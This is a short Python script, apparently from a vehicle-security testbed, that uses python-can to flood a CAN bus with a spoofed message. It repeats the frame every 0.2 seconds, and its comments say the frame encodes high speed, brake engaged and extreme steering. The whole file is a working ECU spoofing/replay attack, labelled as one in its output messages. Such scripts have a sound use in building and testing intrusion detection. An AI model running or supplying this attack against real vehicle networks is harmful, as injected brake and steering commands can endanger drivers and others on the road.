import can
import time
from config.can_config import CAN_INTERFACE, CAN_CHANNEL, CAN_ID

bus = can.interface.Bus(
    channel=CAN_CHANNEL,
    interface=CAN_INTERFACE
)

print("[ATTACK] Replay / ECU spoofing attack started")

# Abnormal fixed values
msg = can.Message(
    arbitration_id=CAN_ID,
    data=[220, 1, 70],  # high speed, brake ON, extreme steering
    is_extended_id=False
)

try:
    while True:
        bus.send(msg)
        time.sleep(0.2)

except KeyboardInterrupt:
    print("\n[ATTACK] Replay attack stopped")

finally:
    bus.shutdown()
    print("[ATTACK] CAN bus closed cleanly")
